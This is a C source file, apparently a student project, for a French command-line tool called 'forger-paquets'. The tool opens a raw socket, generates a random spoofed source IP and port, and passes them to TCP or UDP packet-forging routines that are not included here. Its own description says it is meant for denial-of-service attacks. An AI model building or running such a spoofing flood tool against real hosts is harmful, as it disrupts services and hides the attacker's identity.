#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/ip.h>     // Déclarations entête IP
#include <netinet/tcp.h>    // Déclarations entête TCP
#include <netinet/udp.h>    // Déclarations entête UDP
#include <time.h>           // rand()
#include <argp.h>           // Traitement arguments et options

#include "traitementTCP.h"
#include "traitementUDP.h"
#include "randGen.h"
#include "checksum.h"
#include "pseudoHeader.h"
#include "stringIP.h"

const char *argp_program_version = "forger-paquets 0.1.0";


struct arguments {
    char *args[4];
    int verbose; // -v
    char *outfile; // -o
    char *string1, *string2, *s_ip, *s_port; // arguments pour -a -b -i -p
    char *d_ip, *protocole; // adresse IP destination, spécifiée par l'utilisateur
    int d_port; // port destination, spécifié par l'utilisateur
};

static struct argp_option options[] =
{
    {"verbose", 'v', 0, 0, "Produire sortie verbeuse"},
    {"alpha",   'a', "STRING1", 0, "Faire quelque chose avec STRING1 en rapport avec la lettre A"},
    {"bravo",   'b', "STRING2", 0, "Faire quelque chose avec STRING2 en rapport avec la lettre B"},
    {"randsourceip",   'i', "SOURCE_IP", 0, "Spécifier l'adresse IP Source (Aléatoire si non spécifiée)"},
    {"randsourceport",   'p', "SOURCE_PORT", 0, "Spécifier le Port Source (Aléatoire si non spécifié)"},
    {"output",  'o', "OUTFILE", 0, "Prendre OUTFILE comme sortie au lieu de la sortie standard"},
    {0}
};

// PARSER

static error_t
parse_opt (int key, char *arg, struct argp_state *state)
{
  struct arguments *arguments = state->input;

  switch (key)
    {
    case 'v':
      arguments->verbose = 1;
      break;
    case 'i':
      arguments->s_ip = arg;
      break;
    case 'p':
      arguments->s_port = arg;
      break;
    case 'a':
      arguments->string1 = arg;
      break;
    case 'b':
      arguments->string2 = arg;
      break;
    case 'o':
      arguments->outfile = arg;
      break;
    case ARGP_KEY_ARG:
      if (state->arg_num >= 3)
	{
	  argp_usage(state);
	}
      arguments->args[state->arg_num] = arg;
      break;
    case ARGP_KEY_END:
      if (state->arg_num < 2)
	{
	  argp_usage (state);
	}
      break;
    default:
      return ARGP_ERR_UNKNOWN;
    }
  return 0;
}

// ARGS_DOC

static char args_doc[] = "PROTOCOLE IP_DESTINATION PORT_DESTINATION";

// DOC

static char doc[] = "forger-paquets -- Un programme pour forger des paquets IP et mettre en oeuvre des attaques de déni de service.";

// ARGP STRUCTURE

static struct argp argp = {options, parse_opt, args_doc, doc};

int main (int argc, char **argv) {

    //récupération des arguments
    /*
    char protocole[4], ipsource[32], ipdest[32];


    strcpy(protocole, argv[1]);
    strcpy(ipsource, argv[2]);
    strcpy(ipdest, argv[3]);
    dest_port = atoi(argv[4]);*/

    struct arguments arguments;
    FILE *outstream;

    // ARGUMENTS PAR DÉFAUT

    arguments.outfile = NULL;
    arguments.string1 = "";
    arguments.string2 = "";
    arguments.verbose = 0;
    arguments.s_ip = "";
    arguments.s_port = "";
    arguments.protocole = "";
    arguments.d_ip = "";
    arguments.d_port = 0;

    // PARSING ARGUMENTS

    argp_parse(&argp, argc, argv, 0, 0, &arguments);

    // RENVOI OUTPUT

    if (arguments.outfile)
        outstream = fopen(arguments.outfile, "w");
    else
        outstream = stdout;

    // PRINT VALEURS ARGUMENTS

    fprintf (outstream, "IP_SOURCE = %s\nPORT_SOURCE = %s\n\n",
	   arguments.s_ip, arguments.s_port);
    fprintf (outstream, "PROTOCOLE = %s\nIP_DESTINATION = %s\nPORT_DESTINATION = %s\n\n",
	   arguments.args[0],
	   arguments.args[1],
	   arguments.args[2]);



    srand(time(NULL));

    //création du socket raw

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if(s < 0) {
        perror("erreur socket(), essayez sudo.");
        exit(1);
    }

    printf("socket OK.\n\n"); //pour débuggage, à déplacer dans verbose output

    unsigned short source_port;

    //représentation du paquet sous forme de datagramme
    char datagram[1024], source_ip[32], *data;//, *pseudogram;

    //initialiser le tampon à 0
    memset(datagram, 0, sizeof(datagram));

    //entete IP
    //struct iphdr *iph = (struct iphdr *)datagram;

    //while(1) {

    //notre ip spoofée

    uint32_t ips = rand(); //on génère un bête entier 32 bits
    strcpy(source_ip, stringIP(ips));

    /*if (arguments.s_ip)                                                   // MARCHE PAS
        strcpy(source_ip, arguments.s_ip);*/


    source_port = randGen(1024, 65535); //générer port destination aléatoire entre 1024 et 65535

    // VERBOSE OUTPUT

    if (arguments.verbose)
        fprintf (outstream, "protocole \t: %s\nipsource \t: %s\nport source \t: %d\nipdest \t\t: %s\nport dest \t: %d\n\n", arguments.args[0], source_ip, source_port, arguments.args[1], atoi(arguments.args[2]));

    //printf("protocole \t: %s\nipsource \t: %s\nport source \t: %d\nipdest \t\t: %s\nport dest \t: %d\n\n", arguments.args[0], source_ip, source_port, arguments.args[1], atoi(arguments.args[2])); //debuggage


    if(strcmp(arguments.args[0], "udp") == 0) {
        traitementUDP(s, datagram, data, source_ip, arguments.args[1], source_port, arguments.args[2]);
    }

    else if(strcmp(arguments.args[0], "tcp") == 0) {
        traitementTCP(s, datagram, data, source_ip, arguments.args[1], source_port, arguments.args[2]);
    }

    //}


    return 0;
}
